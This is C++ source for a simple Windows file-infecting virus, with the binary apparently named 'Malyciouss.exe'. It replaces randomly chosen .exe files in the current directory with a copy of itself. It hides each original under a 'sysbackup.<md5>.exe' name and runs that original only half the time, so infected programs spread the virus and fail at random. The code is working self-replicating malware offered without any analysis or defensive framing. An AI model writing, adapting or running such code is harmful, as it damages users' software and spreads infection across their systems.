#include <filesystem>
#include <iostream>
#include <string>
#include <vector>

#include <windows.h>

#include "md5.h"

void infectRandomFile(std::string myFilename) {
    std::string originalFileFilename = myFilename;

    std::vector<std::string> files = std::vector<std::string>();

    for (const std::filesystem::directory_entry& dir_entry : std::filesystem::directory_iterator{"."}) {
        if (dir_entry.path().filename().string().find("sysbackup.") == 0) continue;
        
        if (dir_entry.path().extension() == ".exe") {
            files.push_back(dir_entry.path().filename().string());
        }
    }

    while (originalFileFilename == myFilename) {
        // Pick a random file to infect.
        int randomIndex = rand() % files.size();
        originalFileFilename = files[randomIndex];
    }

    std::string destination = (std::string) "sysbackup." + md5(originalFileFilename) + ".exe";

    std::filesystem::remove(destination);
    std::filesystem::copy(originalFileFilename, destination);

    std::filesystem::remove(originalFileFilename);
    std::filesystem::copy(myFilename, originalFileFilename);

    DWORD attributes = GetFileAttributes(destination.c_str());
    SetFileAttributes(destination.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
}

void runOriginalFile(int argc, char** argv, std::string myFilename) {
    std::string originalFileFilename = (std::string) "sysbackup." + md5(myFilename) + ".exe";

    std::string args = "";
    for (int i = 1; i < argc; i++) {
        args += argv[i];
    }

    std::system((originalFileFilename + (std::string) " " + args).c_str());
}

int main(int argc, char** argv) {
    std::srand(std::time(nullptr));

    std::string argv0 = argv[0];

    // If argv0 ends with ".exe"
    if (argv0.find(".exe") == std::string::npos) {
        argv0 += ".exe";
    }

    infectRandomFile(argv0);

    if (argv0 != (std::string) "Malyciouss.exe") {
        if ((rand() % 2) == 0) {
            runOriginalFile(argc, argv, argv0);
        }
    }

    return 0;
}